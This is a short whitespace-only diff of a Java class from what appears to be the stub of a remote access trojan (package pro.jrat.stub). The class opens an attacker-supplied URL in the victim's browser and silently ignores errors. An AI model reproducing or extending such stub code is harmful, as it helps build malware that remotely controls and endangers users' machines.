@@ -4,7 +4,6 @@ import java.net.URI;
 
 import pro.jrat.stub.Connection;
 
-
 public class Packet14VisitURL extends AbstractIncomingPacket {
 
 	@Override
@@ -13,8 +12,8 @@ public class Packet14VisitURL extends AbstractIncomingPacket {
 		try {
 			java.awt.Desktop.getDesktop().browse(new URI(url));
 		} catch (Exception ex) {
-			
-		}	
+
+		}
 	}
 
 }
